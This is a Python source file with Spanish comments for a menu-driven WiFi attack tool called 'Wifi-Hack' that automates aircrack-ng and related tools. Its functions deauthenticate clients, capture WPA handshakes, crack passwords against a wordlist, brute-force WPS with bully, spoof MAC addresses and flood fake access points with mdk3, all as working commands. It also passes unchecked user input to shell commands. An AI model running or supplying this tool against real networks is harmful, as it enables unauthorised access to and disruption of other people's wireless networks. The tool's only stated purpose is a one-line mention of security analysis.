#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Wifi-Hack: Herramienta de penetración para redes WiFi
Automatiza procesos de aircrack-ng para análisis de seguridad
"""

import os
import sys
import time
import subprocess
import logging
from pathlib import Path
from typing import Optional, Tuple
from banner.banner import banner, menu, goodbye, clear_screen

# ============================================================
# CONFIGURACIÓN Y CONSTANTES
# ============================================================

# Colores ANSI
class Color:
    RED = '\033[1;31m'
    GREEN = '\033[1;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[1;34m'
    MAGENTA = '\033[1;35m'
    CYAN = '\033[1;36m'
    WHITE = '\033[1;37m'
    RESET = '\033[0m'

# Configurar logging
LOG_FILE = "wifi-hack.log"
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ============================================================
# FUNCIONES AUXILIARES
# ============================================================

def print_header(text: str) -> None:
    """Imprime un encabezado formateado"""
    print(f"\n{Color.CYAN}{'='*60}{Color.RESET}")
    print(f"{Color.MAGENTA}▶ {text}{Color.RESET}")
    print(f"{Color.CYAN}{'='*60}{Color.RESET}\n")

def print_success(text: str) -> None:
    """Imprime un mensaje de éxito"""
    print(f"{Color.GREEN}[✓]{Color.RESET} {text}")
    logger.info(f"SUCCESS: {text}")

def print_error(text: str) -> None:
    """Imprime un mensaje de error"""
    print(f"{Color.RED}[✗]{Color.RESET} {text}")
    logger.error(f"ERROR: {text}")

def print_warning(text: str) -> None:
    """Imprime un mensaje de advertencia"""
    print(f"{Color.YELLOW}[!]{Color.RESET} {text}")
    logger.warning(f"WARNING: {text}")

def print_info(text: str) -> None:
    """Imprime un mensaje informativo"""
    print(f"{Color.CYAN}[i]{Color.RESET} {text}")
    logger.info(f"INFO: {text}")

def get_input(prompt: str, input_type=str, validation_func=None) -> any:
    """
    Obtiene entrada del usuario con validación
    
    Args:
        prompt: Texto a mostrar
        input_type: Tipo de dato esperado
        validation_func: Función para validar entrada
    
    Returns:
        Valor validado o None si el usuario cancela
    """
    while True:
        try:
            user_input = input(f"{Color.GREEN}➜{Color.RESET} {prompt}")
            
            if user_input.lower() in ['q', 'exit']:
                return None
            
            # Convertir tipo
            if input_type != str:
                try:
                    user_input = input_type(user_input)
                except ValueError:
                    print_error(f"Ingrese un valor válido de tipo {input_type.__name__}")
                    continue
            
            # Validación adicional
            if validation_func and not validation_func(user_input):
                print_error("Entrada no válida. Intente de nuevo")
                continue
            
            return user_input
            
        except KeyboardInterrupt:
            print_warning("Operación cancelada por el usuario")
            return None
        except Exception as e:
            print_error(f"Error al leer entrada: {e}")
            continue

def run_command(command: str, description: str = "") -> bool:
    """
    Ejecuta un comando del sistema con manejo de errores
    
    Args:
        command: Comando a ejecutar
        description: Descripción de la operación
    
    Returns:
        True si el comando fue exitoso, False en caso contrario
    """
    try:
        if description:
            print_info(f"Ejecutando: {description}")
        
        result = subprocess.run(
            command, 
            shell=True, 
            capture_output=False,
            timeout=300
        )
        
        if result.returncode == 0:
            if description:
                print_success(description)
            return True
        else:
            print_error(f"Comando fallido: {command}")
            return False
            
    except subprocess.TimeoutExpired:
        print_error("El comando excedió el tiempo de espera")
        return False
    except KeyboardInterrupt:
        print_warning("Operación interrumpida por el usuario")
        return False
    except Exception as e:
        print_error(f"Error al ejecutar comando: {e}")
        return False

def validate_interface(interface: str) -> bool:
    """Valida que la interfaz sea válida"""
    result = subprocess.run(
        f"ip link show {interface}",
        shell=True,
        capture_output=True
    )
    return result.returncode == 0

def validate_file_exists(filepath: str) -> bool:
    """Valida que un archivo existe"""
    return Path(filepath).exists()

def validate_mac_address(mac: str) -> bool:
    """Valida formato de dirección MAC"""
    import re
    pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
    return bool(re.match(pattern, mac))

# ============================================================
# FUNCIONES PRINCIPALES
# ============================================================

def mode_monitor_start():
    """Inicia modo monitor en una interfaz"""
    print_header("Iniciar Modo Monitor")
    
    interface = get_input(
        f"Interfaz (ej: {Color.CYAN}wlan0{Color.RESET}): ",
        validation_func=lambda x: x and len(x) > 0
    )
    
    if not interface:
        return
    
    if not validate_interface(interface):
        print_error(f"Interfaz '{interface}' no encontrada")
        return
    
    command = f"sudo airmon-ng start {interface} && sudo airmon-ng check kill"
    if run_command(command, f"Activar modo monitor en {interface}"):
        print_success(f"Modo monitor activado en {interface}")
        logger.info(f"Monitor mode started on {interface}")

def mode_monitor_stop():
    """Detiene modo monitor en una interfaz"""
    print_header("Detener Modo Monitor")
    
    interface = get_input(
        f"Interfaz monitor (ej: {Color.CYAN}wlan0mon{Color.RESET}): ",
        validation_func=lambda x: x and len(x) > 0
    )
    
    if not interface:
        return
    
    command = f"sudo airmon-ng stop {interface}"
    if run_command(command, f"Detener modo monitor en {interface}"):
        print_success(f"Modo monitor detenido")
        logger.info(f"Monitor mode stopped on {interface}")

def show_interfaces():
    """Muestra las interfaces de red disponibles"""
    print_header("Interfaces de Red")
    run_command("sudo ifconfig", "Mostrando interfaces...")

def restart_network():
    """Reinicia los servicios de red"""
    print_header("Reiniciar Red")
    print_warning("Reiniciando servicios de red...")
    
    command = "sudo service networking restart && sudo systemctl start NetworkManager"
    run_command(command, "Reinicio de red completado")

def scan_networks():
    """Escanea redes WiFi cercanas"""
    print_header("Escanear Redes WiFi")
    
    interface = get_input(
        f"Interfaz monitor (ej: {Color.CYAN}wlan0mon{Color.RESET}): ",
        validation_func=lambda x: x and len(x) > 0
    )
    
    if not interface:
        return
    
    output_name = get_input(
        f"Nombre del archivo de salida (default: {Color.CYAN}redes-output{Color.RESET}): "
    ) or "redes-output"
    
    # Crear directorio si no existe
    Path("scan-output").mkdir(exist_ok=True)
    
    command = f"sudo airodump-ng --write scan-output/{output_name} --output-format csv {interface}"
    
    print_warning("Presione CTRL+C para detener el escaneo")
    time.sleep(2)
    
    run_command(command, f"Escaneo de redes en {interface}")
    
    output_file = Path(f"scan-output/{output_name}01.csv")
    if output_file.exists():
        print_success(f"Datos guardados en: {Color.CYAN}{output_file}{Color.RESET}")
    else:
        print_warning("No se encontró archivo de salida")

def capture_handshake():
    """Captura handshake WPA/WPA2"""
    print_header("Capturar Handshake WPA/WPA2")
    
    interface = get_input(
        f"Interfaz monitor (ej: {Color.CYAN}wlan0mon{Color.RESET}): ",
        validation_func=lambda x: x and len(x) > 0
    )
    
    if not interface:
        return
    
    # Escanear redes
    print_info("Escaneando redes disponibles...")
    print_warning("Presione CTRL+C para continuar cuando vea la red objetivo")
    run_command(f"sudo airodump-ng {interface}")
    
    bssid = get_input(
        f"BSSID del objetivo (ej: {Color.CYAN}AA:BB:CC:DD:EE:FF{Color.RESET}): ",
        validation_func=lambda x: len(x) == 17 and ':' in x
    )
    
    if not bssid:
        return
    
    channel = get_input(
        "Canal del objetivo: ",
        int,
        lambda x: 1 <= x <= 165
    )
    
    if channel is None:
        return
    
    output_path = get_input(
        f"Ruta para guardar handshake (default: {Color.CYAN}./handshake{Color.RESET}): "
    ) or "./handshake"
    
    packets = get_input(
        "Número de paquetes de desautenticación (max 10000): ",
        int,
        lambda x: 0 <= x <= 10000
    )
    
    if packets is None:
        return
    
    # Capturar handshake
    print_info("Capturando handshake. Presione CTRL+C para detener...")
    capture_cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_path} {interface}"
    
    # Ejecutar en paralelo la inyección
    try:
        print_warning("Inyectando paquetes de desautenticación...")
        inject_cmd = f"sudo aireplay-ng -0 {packets} -a {bssid} {interface}"
        subprocess.Popen(inject_cmd, shell=True)
        
        run_command(capture_cmd, "Captura de handshake")
        
        cap_file = Path(f"{output_path}-01.cap")
        if cap_file.exists():
            print_success(f"Handshake guardado en: {Color.CYAN}{cap_file}{Color.RESET}")
        else:
            print_warning("No se encontró el archivo de handshake")
            
    except KeyboardInterrupt:
        print_warning("Captura interrumpida")

def crack_password():
    """Descifra contraseña WiFi con diccionario"""
    print_header("Descifrar Contraseña WiFi")
    
    handshake = get_input(
        "Ruta del archivo handshake (ej: ./handshake-01.cap): ",
        validation_func=validate_file_exists
    )
    
    if not handshake:
        return
    
    wordlist = get_input(
        "Ruta del diccionario (ej: ./wordlist/rockyou.txt): ",
        validation_func=validate_file_exists
    )
    
    if not wordlist:
        return
    
    command = f"sudo aircrack-ng {handshake} -w {wordlist}"
    run_command(command, "Descifrado de contraseña")

def attack_wps():
    """Ataca redes con WPS habilitado usando Bully"""
    print_header("Ataque WPS (Bully)")
    
    interface = get_input(
        f"Interfaz monitor (ej: {Color.CYAN}wlan0mon{Color.RESET}): ",
        validation_func=lambda x: x and len(x) > 0
    )
    
    if not interface:
        return
    
    bssid = get_input(
        f"BSSID del AP (ej: {Color.CYAN}AA:BB:CC:DD:EE:FF{Color.RESET}): ",
        validation_func=lambda x: len(x) == 17 and ':' in x
    )
    
    if not bssid:
        return
    
    channel = get_input("Canal del AP: ", int, lambda x: 1 <= x <= 165)
    
    if channel is None:
        return
    
    essid = get_input("ESSID/Nombre del AP: ", validation_func=lambda x: len(x) > 0)
    
    if not essid:
        return
    
    command = f"sudo bully {interface} -b {bssid} -c {channel} -e {essid} --force"
    run_command(command, f"Ataque WPS en {essid}")

def spoof_mac():
    """Falsifica dirección MAC"""
    print_header("Falsificar Dirección MAC")
    
    interface = get_input(
        f"Interfaz (ej: {Color.CYAN}wlan0{Color.RESET}): ",
        validation_func=validate_interface
    )
    
    if not interface:
        return
    
    new_mac = get_input(
        "Nueva dirección MAC (ej: AA:BB:CC:DD:EE:FF): ",
        validation_func=validate_mac_address
    )
    
    if not new_mac:
        return
    
    print_info(f"Cambiar MAC de {interface} a {new_mac}")
    
    try:
        run_command(f"sudo ifconfig {interface} down", f"Desactivando {interface}")
        run_command(
            f"sudo ifconfig {interface} hw ether {new_mac}",
            f"Cambiando MAC a {new_mac}"
        )
        run_command(f"sudo ifconfig {interface} up", f"Activando {interface}")
        
        print_success("MAC falsificada correctamente")
        time.sleep(2)
        run_command(f"sudo ifconfig {interface}", "Verificando MAC")
        
    except Exception as e:
        print_error(f"Error al falsificar MAC: {e}")

def fake_ap():
    """Crea punto de acceso falso"""
    print_header("Fake AP (Punto de Acceso Falso)")
    
    interface = get_input(
        f"Interfaz (ej: {Color.CYAN}wlan0{Color.RESET}): ",
        validation_func=lambda x: x and len(x) > 0
    )
    
    if not interface:
        return
    
    channel = get_input("Canal: ", int, lambda x: 1 <= x <= 165)
    
    if channel is None:
        return
    
    # Opción de crear diccionario
    create_dict = get_input(
        f"¿Crear diccionario de APs? ({Color.GREEN}y{Color.RESET}/{Color.RED}n{Color.RESET}): "
    )
    
    if create_dict and create_dict.lower() == 'y':
        print_info("Ejecutando generador de APs...")
        run_command("sudo bash AP_generator.sh", "Generador de APs")
    
    wordlist = get_input(
        f"Ruta del diccionario (default: {Color.CYAN}wordlist/fakeAP.txt{Color.RESET}): "
    ) or "wordlist/fakeAP.txt"
    
    if not validate_file_exists(wordlist):
        print_error(f"Archivo no encontrado: {wordlist}")
        return
    
    print_warning("Presione CTRL+C para detener el ataque")
    
    command = f"sudo mdk3 {interface} b -f {wordlist} -a -s 1000 -c {channel}"
    run_command(command, "Fake AP iniciado")

# ============================================================
# MENÚ PRINCIPAL
# ============================================================

def main():
    """Función principal"""
    
    options = {
        1: ("Iniciar modo monitor", mode_monitor_start),
        2: ("Detener modo monitor", mode_monitor_stop),
        3: ("Ver interfaces de red", show_interfaces),
        4: ("Reiniciar red", restart_network),
        5: ("Escanear redes WiFi", scan_networks),
        6: ("Capturar Handshake", capture_handshake),
        7: ("Descifrar contraseña", crack_password),
        8: ("Ataque WPS (Bully)", attack_wps),
        9: ("Falsificar MAC", spoof_mac),
        10: ("Fake AP", fake_ap),
        0: ("Salir", None)
    }
    
    while True:
        try:
            clear_screen()
            banner()
            menu()
            
            choice = get_input("Selecciona una opción: ", int)
            
            if choice is None:
                continue
            
            if choice == 0:
                clear_screen()
                goodbye()
                print_success("¡Hasta luego!")
                logger.info("Application closed")
                sys.exit(0)
            
            if choice in options:
                _, function = options[choice]
                if function:
                    try:
                        function()
                    except Exception as e:
                        print_error(f"Error en la operación: {e}")
                        logger.exception(f"Exception in {function.__name__}")
                else:
                    break
                
                # Pausa antes de volver al menú
                input(f"\n{Color.CYAN}Presione Enter para continuar...{Color.RESET}")
            else:
                print_error(f"Opción '{choice}' no válida. Intente de nuevo")
                time.sleep(2)
                
        except KeyboardInterrupt:
            print_warning("\nOperación interrumpida")
            logger.info("Application interrupted by user")
            sys.exit(0)
        except ValueError:
            print_error("Por favor ingrese un número válido")
            time.sleep(2)
        except Exception as e:
            print_error(f"Error inesperado: {e}")
            logger.exception("Unexpected error")
            time.sleep(2)

# ============================================================
# PUNTO DE ENTRADA
# ============================================================

if __name__ == "__main__":
    # Verificar permisos
    if os.geteuid() != 0:
        print_error("Este programa debe ejecutarse con sudo")
        sys.exit(1)
    
    logger.info("Wifi-Hack started")
    main()
